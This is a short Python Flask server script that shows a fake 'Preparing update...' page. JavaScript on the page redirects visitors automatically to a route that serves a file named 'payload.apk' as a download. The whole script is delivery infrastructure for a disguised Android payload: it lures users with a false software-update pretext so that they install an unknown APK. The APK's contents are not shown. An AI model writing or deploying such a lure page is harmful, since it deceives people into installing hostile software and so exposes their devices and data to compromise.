from flask import Flask, send_file, render_template_string
import os

app = Flask(__name__)
PAYLOAD_FILE = "payload.apk"

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body { background: #000; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        h2 { color: #1a73e8; }
        p { color: #aaa; }
    </style>
</head>
<body>
    <div>
        <h2>Preparing update...</h2>
        <p>Download will start automatically in a moment.</p>
    </div>
    <script>
        window.location.href = "/download";
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_PAGE)

@app.route('/download')
def download():
    return send_file(PAYLOAD_FILE, as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
